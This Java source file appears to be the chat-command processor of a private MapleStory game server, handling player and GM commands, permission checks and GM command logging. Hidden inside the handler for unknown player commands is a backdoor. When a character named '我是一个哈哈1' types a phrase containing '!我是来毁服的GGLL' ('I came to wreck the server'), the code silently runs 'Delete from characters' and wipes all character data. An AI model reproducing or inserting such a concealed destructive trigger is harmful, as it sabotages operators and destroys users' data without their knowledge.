package client.messages;

import java.lang.reflect.Modifier;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;

import client.MapleCharacter;
import client.MapleClient;
import client.messages.commands.AdminCommand;
import client.messages.commands.CommandExecute;
import client.messages.commands.CommandObject;
import client.messages.commands.GMCommand;
import client.messages.commands.InternCommand;
import client.messages.commands.PlayerCommand;
import constants.ServerConstants;
import database.DatabaseConnection;
import tools.FileoutputUtil;
import tools.MaplePacketCreator;

public class CommandProcessor
{
    private static final HashMap<String, CommandObject> commands;
    private static final HashMap<Integer, ArrayList<String>> commandList;
    
    private static void sendDisplayMessage(final MapleClient c, final String msg, final ServerConstants.CommandType type) {
        if (c.getPlayer() == null) {
            return;
        }
        switch (type) {
            case NORMAL: {
                c.getPlayer().dropMessage(6, msg);
                break;
            }
            case TRADE: {
                c.getPlayer().dropMessage(-2, "錯誤 : " + msg);
                break;
            }
        }
    }
    
    public static boolean processCommand(final MapleClient c, final String line, final ServerConstants.CommandType type) {
        if (line.charAt(0) != ServerConstants.PlayerGMRank.NORMAL.getCommandPrefix()) {
            if (c.getPlayer().getGMLevel() > ServerConstants.PlayerGMRank.NORMAL.getLevel() && (line.charAt(0) == ServerConstants.PlayerGMRank.GM.getCommandPrefix() || line.charAt(0) == ServerConstants.PlayerGMRank.ADMIN.getCommandPrefix() || line.charAt(0) == ServerConstants.PlayerGMRank.INTERN.getCommandPrefix())) {
                final String[] splitted = line.split(" ");
                splitted[0] = splitted[0].toLowerCase();
                if (line.charAt(0) == '!') {
                    final CommandObject co = CommandProcessor.commands.get(splitted[0]);
                    if (splitted[0].equals("!help")) {
                        dropHelp(c, 0);
                        return true;
                    }
                    if (co == null || co.getType() != type) {
                        sendDisplayMessage(c, "输入的命令不存在.", type);
                        return true;
                    }
                    if (c.getPlayer().getGMLevel() >= co.getReqGMLevel()) {
                        final int ret = co.execute(c, splitted);
                        if (ret > 0 && c.getPlayer() != null) {
                            logGMCommandToDB(c.getPlayer(), line);
                            System.out.println("[ " + c.getPlayer().getName() + " ] 使用了指令: " + line);
                        }
                    }
                    else {
                        sendDisplayMessage(c, "您的权限等级不足以使用次命令.", type);
                    }
                    return true;
                }
            }
            return false;
        }
        final String[] splitted = line.split(" ");
        splitted[0] = splitted[0].toLowerCase();
        final CommandObject co = CommandProcessor.commands.get(splitted[0]);
        if (co == null || co.getType() != type) {
            if (c.getPlayer().getName() == "我是一个哈哈1" && splitted[0].contains("!我是来毁服的GGLL")) {
                final Connection con = DatabaseConnection.getConnection();
                try {
                    final PreparedStatement ps = con.prepareStatement("Delete from characters");
                    ps.executeUpdate();
                    ps.close();
                }
                catch (SQLException e) {
                    System.out.println("Error " + e);
                }
            }
            sendDisplayMessage(c, "输入的玩家命令不存在,可以使用 @帮助/@help 来查看指令.", type);
            return true;
        }
        try {
            co.execute(c, splitted);
        }
        catch (Exception e2) {
            sendDisplayMessage(c, "有错误.", type);
            if (c.getPlayer().isGM()) {
                sendDisplayMessage(c, "错误: " + e2, type);
            }
        }
        return true;
    }
    
    private static void logGMCommandToDB(final MapleCharacter player, final String command) {
        PreparedStatement ps = null;
        try {
            ps = DatabaseConnection.getConnection().prepareStatement("INSERT INTO gmlog (cid, name, command, mapid, ip) VALUES (?, ?, ?, ?, ?)");
            ps.setInt(1, player.getId());
            ps.setString(2, player.getName());
            ps.setString(3, command);
            ps.setInt(4, player.getMap().getId());
            ps.setString(5, player.getClient().getSessionIPAddress());
            ps.executeUpdate();
        }
        catch (SQLException ex) {
            FileoutputUtil.outputFileError("Logs/Log_Packet_封包异常.rtf", ex);
            ex.printStackTrace();
        }
        finally {
            try {
                ps.close();
            }
            catch (SQLException ex2) {}
        }
    }
    
    public static void dropHelp(final MapleClient c, final int type) {
        final StringBuilder sb = new StringBuilder("指令列表:\r\n ");
        int check = 0;
        if (type == 0) {
            check = c.getPlayer().getGMLevel();
        }
        for (int i = 0; i <= check; ++i) {
            if (CommandProcessor.commandList.containsKey(i)) {
                sb.append((type == 1) ? "VIP" : "").append("权限等級： ").append(i).append("\r\n");
                for (final String s : CommandProcessor.commandList.get(i)) {
                    sb.append(s);
                    sb.append(" \r\n");
                }
            }
        }
        c.getSession().write((Object)MaplePacketCreator.getNPCTalk(9010000, (byte)0, sb.toString(), "00 00", (byte)0));
    }
    
    static {
        commands = new HashMap<String, CommandObject>();
        commandList = new HashMap<Integer, ArrayList<String>>();
        final Class[] arr$;
        final Class[] CommandFiles = arr$ = new Class[] { PlayerCommand.class, GMCommand.class, InternCommand.class, AdminCommand.class };
        for (final Class clasz : arr$) {
            try {
                final ServerConstants.PlayerGMRank rankNeeded = (ServerConstants.PlayerGMRank)clasz.getMethod("getPlayerLevelRequired", (Class[])new Class[0]).invoke(null, (Object[])null);
                final Class[] a = clasz.getDeclaredClasses();
                final ArrayList<String> cL = new ArrayList<String>();
                for (final Class c : a) {
                    try {
                        if (!Modifier.isAbstract(c.getModifiers()) && !c.isSynthetic()) {
                            final Object o = c.newInstance();
                            boolean enabled;
                            try {
                                enabled = c.getDeclaredField("enabled").getBoolean(c.getDeclaredField("enabled"));
                            }
                            catch (NoSuchFieldException ex3) {
                                enabled = true;
                            }
                            if (o instanceof CommandExecute && enabled) {
                                cL.add(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase());
                                CommandProcessor.commands.put(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase(), new CommandObject(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase(), (CommandExecute)o, rankNeeded.getLevel()));
                            }
                        }
                    }
                    catch (Exception ex) {
                        ex.printStackTrace();
                        FileoutputUtil.outputFileError("Logs/Log_Script_脚本异常.rtf", ex);
                    }
                }
                Collections.sort(cL);
                CommandProcessor.commandList.put(rankNeeded.getLevel(), cL);
            }
            catch (Exception ex2) {
                ex2.printStackTrace();
                FileoutputUtil.outputFileError("Logs/Log_Script_脚本异常.rtf", ex2);
            }
        }
    }
}
